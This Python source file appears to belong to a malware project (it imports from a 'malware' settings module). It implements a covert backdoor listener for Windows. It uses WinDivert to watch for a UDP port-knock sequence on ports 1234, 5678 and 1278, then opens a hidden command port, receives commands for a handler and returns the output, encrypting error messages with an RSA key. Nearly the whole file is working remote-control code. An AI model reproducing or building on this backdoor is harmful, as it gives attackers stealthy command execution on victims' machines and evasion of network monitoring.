import socket
import pydivert
import time
from malware.settings import PORTS, COMMAND_PORT
from typing import Callable
from general.enc_layer import encrypt_data
from malware.settings import RSA_KEY

BUFSIZE = 4096


def int_from_bytes(xbytes: bytes) -> int:
    return int.from_bytes(xbytes, 'big')


def int_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')


def listen_for_commands(on_recv: Callable[[str], bytes]) -> None:
    """
        This function waits for the correct pattern of port knocks and then opens the COMMAND_PORT to recieve commands.
        The commands are then passed to the on_recv function and the response is sent back to the client.
    """
    while True:
        print(f"wait for mas")
        e1 = e2 = e3 = e = False

        while not e:
            with pydivert.WinDivert(filter="udp.DstPort == 1234 or udp.DstPort == 5678 or udp.DstPort == 1278") as w:
                for packet in w:
                    if packet.dst_port == PORTS[0]:
                        e1 = True
                        e2 = False
                    elif packet.dst_port == PORTS[1] and e1:
                        e1 = False
                        e2 = True
                    elif packet.dst_port == PORTS[2] and e2:
                        e = True
                        break

        received = 0
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(('0.0.0.0', COMMAND_PORT))
        data, conn = s.recvfrom(BUFSIZE)
        size = int(int_from_bytes(data))
        rec_data = bytearray()
        while received < size:
            data, _ = s.recvfrom(BUFSIZE)
            rec_data += data
            received += len(data)
        time.sleep(0.5)
        try:
            data = on_recv(rec_data.decode('utf-8'))
        except Exception as ex:
            data = encrypt_data("Exception: {}".format(ex), RSA_KEY)
        s.sendto(int_to_bytes(len(data)), conn)
        s.sendto(data, conn)
        print(f"got massage")